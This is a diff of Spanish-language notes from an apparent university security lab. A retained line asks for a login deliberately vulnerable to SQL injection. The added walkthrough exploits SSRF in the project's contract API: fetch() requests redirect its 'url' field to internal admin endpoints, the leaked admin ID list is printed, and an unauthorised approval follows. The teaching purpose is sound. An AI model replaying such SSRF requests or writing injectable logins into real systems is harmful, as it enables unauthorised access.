@@ -58,4 +58,116 @@ Registro y actualización de datos personales.
 Consulta de nóminas y recibos de sueldo.
 Descarga de documentos laborales (contratos, certificados, etc.).
 
-Utilizaré la estructura que me indicaste anteriormente, por el momento solo necesito que me ayudes a crear la logica de login de forma tal que sea vulnerable a A3: sql Injection(se utilizará una base de datos mysql con una tabla usuarios con los campos dni, email, etc). 
+Utilizaré la estructura que me indicaste anteriormente, por el momento solo necesito que me ayudes a crear la logica de login de forma tal que sea vulnerable a A3: sql Injection(se utilizará una base de datos mysql con una tabla usuarios con los campos dni, email, etc).
+
+
+
+
+SSRF
+
+Paso 1
+Acceder al formulario --> aceptar la propuesta (Se esta aceptando la propuesta del 754)
+
+Paso 2
+Se observa que se hace aprobo la contratacion exitosamente, una llamada a http://localhost:8080/api/contract , donde se le pasa
+   --->email: "ejemplo@gmail.com"
+   --->url: "https://tp-seg-app-web.onrender.com/api/approve?id=702"
+
+Paso 3
+Se envia la solicitud pero cambiando la url por https://tp-seg-app-web.onrender.com/api/approve/admin;
+		Se obtiene el siguiente html con los contratos disponibles para aprobar, se valida el id y el contratante
+
+
+fetch('http://localhost:8080/api/contract', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        email: "ejemplo@gmail.com",
+        url: "https://tp-seg-app-web.onrender.com/api/admin"
+    })
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Error en la solicitud: ' + response.statusText);
+    }
+    return response.json().catch(() => response.text()); // Intentar JSON, y si falla, usar texto
+})
+.then(data => console.log('Respuesta del servidor:', data))
+.catch(error => console.error('Error:', error));
+
+<html>
+
+<head>
+    <title>Contract Admin Page</title>
+</head>
+
+<body>
+    <h2>IDs Available for Approval</h2>
+    <ul>
+        <li>ID: 101 - Name: Juan Pérez</li>
+        <li>ID: 234 - Name: Ana Gómez</li>
+        <li>ID: 356 - Name: Carlos Rodríguez</li>
+        <li>ID: 478 - Name: Laura Sánchez</li>
+        <li>ID: 512 - Name: José Martínez</li>
+        <li>ID: 634 - Name: María López</li>
+        <li>ID: 756 - Name: David Fernández</li>
+        <li>ID: 879 - Name: Pedro García</li>
+        <li>ID: 910 - Name: Marta Ruiz</li>
+        <li>ID: 102 - Name: Luis Díaz</li>
+    </ul>
+</body>
+
+</html>
+
+
+Paso 4
+Se Procede a corer el siguiente script para aprobar la contratacion, teniendo el id del Empleado a Contratar(879) --> https://tp-seg-app-web.onrender.com/api/approve/879:
+
+fetch('http://localhost:8080/api/contract', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        email: "ejemplo@gmail.com",
+        url: "https://tp-seg-app-web.onrender.com/api/approve?id=879"
+    })
+})
+.then(response => {
+    if (!response.ok) {
+        throw new Error('Error en la solicitud: ' + response.statusText);
+    }
+    return response.json().catch(() => response.text()); // Intentar JSON, y si falla, usar texto
+})
+.then(data => console.log('Respuesta del servidor:', data))
+.catch(error => console.error('Error:', error));
+
+
+
+Paso 4
+Se envia la solicitud pero cambiando la url por https://tp-seg-app-web.onrender.com/api/admin; Y se observa que el 879 ya no aparece entre los disponibles
+
+<html>
+
+<head>
+    <title>Contract Admin Page</title>
+</head>
+
+<body>
+    <h2>IDs Available for Approval</h2>
+    <ul>
+        <li>ID: 101 - Name: Juan Pérez</li>
+        <li>ID: 234 - Name: Ana Gómez</li>
+        <li>ID: 356 - Name: Carlos Rodríguez</li>
+        <li>ID: 478 - Name: Laura Sánchez</li>
+        <li>ID: 512 - Name: José Martínez</li>
+        <li>ID: 634 - Name: María López</li>
+        <li>ID: 756 - Name: David Fernández</li>
+        <li>ID: 910 - Name: Marta Ruiz</li>
+        <li>ID: 102 - Name: Luis Díaz</li>
+    </ul>
+</body>
+
+</html>
